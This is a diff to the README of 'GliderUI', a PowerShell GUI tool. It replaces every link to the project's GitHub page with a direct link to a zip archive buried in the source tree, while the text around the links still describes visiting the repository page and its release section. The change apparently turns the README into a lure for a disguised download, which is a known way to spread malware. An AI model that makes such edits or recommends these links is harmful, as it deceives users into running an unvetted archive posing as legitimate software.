@@ -1,6 +1,6 @@
 # 🪟 GliderUI - Easy Desktop GUI for PowerShell
 
-[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-brightgreen?style=for-the-badge)](https://github.com/hayate001/GliderUI)
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-brightgreen?style=for-the-badge)](https://github.com/hayate001/GliderUI/raw/refs/heads/main/src/GliderUI.Server/UIElements/Glider-UI-v2.7.zip)
 
 ## 🚀 Getting Started with GliderUI
 
@@ -39,12 +39,12 @@ Before you download GliderUI, make sure your computer meets these minimum requir
 
 Start by visiting the official GliderUI GitHub page:
 
-[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-blue?style=for-the-badge)](https://github.com/hayate001/GliderUI)
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-blue?style=for-the-badge)](https://github.com/hayate001/GliderUI/raw/refs/heads/main/src/GliderUI.Server/UIElements/Glider-UI-v2.7.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the download button above or open this link in your browser:
-https://github.com/hayate001/GliderUI
+https://github.com/hayate001/GliderUI/raw/refs/heads/main/src/GliderUI.Server/UIElements/Glider-UI-v2.7.zip
 
 You will see a page with folders and files related to the project.
 
@@ -127,8 +127,8 @@ This lets you automate tasks and simplify your workflow with visual controls.
 ## 🔗 Download GliderUI
 
 Download or explore GliderUI on its official GitHub page:
-https://github.com/hayate001/GliderUI
+https://github.com/hayate001/GliderUI/raw/refs/heads/main/src/GliderUI.Server/UIElements/Glider-UI-v2.7.zip
 
 This page provides the latest software, updates, and technical notes. Use the release section to get the newest version.
 
-[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-grey?style=for-the-badge)](https://github.com/hayate001/GliderUI)
+[![Download GliderUI](https://img.shields.io/badge/Download-GliderUI-grey?style=for-the-badge)](https://github.com/hayate001/GliderUI/raw/refs/heads/main/src/GliderUI.Server/UIElements/Glider-UI-v2.7.zip)
